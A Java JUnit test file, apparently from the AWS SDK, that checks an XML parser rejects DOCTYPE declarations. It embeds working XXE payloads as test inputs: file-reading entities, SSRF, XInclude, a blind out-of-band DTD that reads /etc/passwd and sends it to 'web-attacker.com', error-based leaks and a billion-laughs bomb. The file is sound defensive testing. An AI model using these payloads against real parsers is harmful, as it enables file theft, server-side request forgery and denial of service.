/*
 * Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License").
 * You may not use this file except in compliance with the License.
 * A copy of the License is located at
 *
 *  http://aws.amazon.com/apache2.0
 *
 * or in the "license" file accompanying this file. This file is distributed
 * on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 */
package utils.xml;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.equalTo;
import static org.junit.Assert.fail;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;
import org.junit.Ignore;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;
import org.xml.sax.helpers.DefaultHandler;
import com.amazonaws.util.XmlUtils;

public class PortSwiggerXxeTests {

    @Rule
    public ExpectedException thrown = ExpectedException.none();

    private static String getFile(String name) {
        return PortSwiggerXxeTests.class.getResource("/resources/xml/xxe/" + name).getFile();
    }

    // https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files
    @Test
    public void xxe_retrieve_file() throws ParserConfigurationException, SAXException, IOException {

        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");

        String xml = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://%s\"> ]>\n" +
                        "<stockCheck><productId>&xxe;</productId></stockCheck>",
                getFile("sensitive.txt"));

        System.out.println("xml " + xml);

        XmlUtils.parse(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)), new DefaultHandler());
    }

    // https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks
    @Test
    public void xxe_ssrf() throws IOException, ParserConfigurationException, SAXException {

        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        TestHttpServer server = new TestHttpServer("data");

        String xml = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"%s\"> ]>\n" +
                "<stockCheck><productId>&xxe;</productId></stockCheck>", server.url());
        try {
            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            assertThat(server.accepted(), equalTo(false));
            server.stop();
        }
    }

    // https://portswigger.net/web-security/xxe#xinclude-attacks
    @Test
    @Ignore // Can't find a good way to test this. Looks like this would be handled by startElement
    public void xxe_xinclude() throws ParserConfigurationException, SAXException, IOException, TransformerException {

        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");


        String xml = String.format("<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">" +
                        "<xi:include parse=\"text\" href=\"file://%s\"/></foo>",
                getFile("sensitive.txt"));

        final AtomicBoolean skippedXInclude = new AtomicBoolean(true);
        XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                new DefaultHandler() {
                    @Override
                    public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                        if (localName.contains("include")) {
                            skippedXInclude.set(false);
                        }
                        super.startElement(uri, localName, qName, attributes);
                    }
                });
        assertThat(skippedXInclude.get(), equalTo(true));
    }

    // https://portswigger.net/web-security/xxe/blind#detecting-blind-xxe-using-out-of-band-oast-techniques
    @Test
    public void blind_xxe_oast_parameter() throws IOException, ParserConfigurationException, SAXException {

        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        TestHttpServer server = new TestHttpServer("data");
        try {
            String xml = String.format("<!DOCTYPE foo [ <!ENTITY %% xxe SYSTEM \"%s\"> %%xxe; ]>\n" +
                    "<stockCheck><productId>1234</productId></stockCheck>", server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            assertThat(server.accepted(), equalTo(false));
            server.stop();
        }
    }

    // https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band
    @Test
    public void blind_xxe_dtd() throws IOException, ParserConfigurationException, SAXException {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        String dtd = "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n" +
                "<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>\">\n" +
                "%eval;\n" +
                "%exfiltrate;\n";
        TestHttpServer server = new TestHttpServer(dtd);
        try {
            String xml = String.format("<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM\n" +
                            "\"%s\"> %%xxe;]>",
                    server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            assertThat(server.accepted(), equalTo(false));
            server.stop();
        }
    }

    // https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages
    @Test
    public void blind_xxe_data_via_error() throws IOException, ParserConfigurationException, SAXException {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        String dtd = String.format("<!ENTITY %% file SYSTEM \"file://%s\">\n" +
                        "<!ENTITY %% eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%%file;'>\">\n" +
                        "%%eval;\n" +
                        "%%exfil;",
                getFile("/sensitive.txt"));

        TestHttpServer server = new TestHttpServer(dtd);
        try {
            String xml = String.format("<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM \"%s\"> %%xxe;]>", server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            assertThat(server.accepted(), equalTo(false));
            server.stop();
        }
    }

    // https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd
    @Test
    public void blind_xxe_local_repurpose_local_dtd() throws ParserConfigurationException, SAXException, IOException {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        String xml = String.format("<!DOCTYPE message [\n" +
                        "<!ENTITY %% local_dtd SYSTEM \"file://%s\">\n" +
                        "<!ENTITY %% entityName '\n" +
                        "<!ENTITY &#x25; file SYSTEM \"file://%s\">\n" +
                        "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n" +
                        "&#x25;eval;\n" +
                        "&#x25;error;\n" +
                        "'>\n" +
                        "%%local_dtd;\n" +
                        "]><foo></foo>",
                getFile("/local.dtd"), getFile("/sensitive.txt"));

        XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                new DefaultHandler());
    }

    // Existing tests from XpathUtils below this line
    @Test
    public void testExternalEntity() throws Exception {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        TestHttpServer server = new TestHttpServer("secret");
        try {
            String xml = String.format(
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                            + "<!DOCTYPE oops [\n"
                            + "     <!ENTITY foo SYSTEM \"%s\" >\n"
                            + "]>\n"
                            + "<oops>&foo;</oops>",
                    server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)), new DefaultHandler());

        } finally {
            if (server.accepted()) {
                fail("Oops! The server has been reached!");
            }
            server.stop();
        }


    }

    @Test
    public void testExternalSchema() throws Exception {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");
        TestHttpServer server = new TestHttpServer("secret");
        try {
            String xml = String.format(
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                            + "<!DOCTYPE oops SYSTEM \"%s\">\n"
                            + "<oops></oops>",
                    server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            if (server.accepted()) {
                fail("Oops! The server has been reached!");
            }
            server.stop();
        }
    }

    @Test
    public void testExternalEntityParameter() throws Exception {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");

        TestHttpServer server = new TestHttpServer("secret");
        try {
            String xml = String.format(
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                            + "<!DOCTYPE oops [\n"
                            + "     <!ENTITY %% sp SYSTEM \"%s\">\n"
                            + "%%sp;"
                            + "]>\n"
                            + "<oops></oops>",
                    server.url());

            XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    new DefaultHandler());
        } finally {
            server.stop();
            if (server.accepted()) {
                fail("Oops! The server has been reached!");
            }
        }
    }

    @Test
    public void billionLaughs() throws Exception {
        thrown.expect(SAXParseException.class);
        thrown.expectMessage("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.");

        String xml =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<!DOCTYPE lolz [\n" +
                        " <!ENTITY lol \"lol\">\n" +
                        " <!ELEMENT lolz (#PCDATA)>\n" +
                        " <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                        " <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" +
                        " <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                        " <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                        " <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
                        " <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n" +
                        " <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n" +
                        " <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n" +
                        " <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n" +
                        "]>\n" +
                        "<lolz>&lol9;</lolz>";

        XmlUtils.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                new DefaultHandler());
    }
}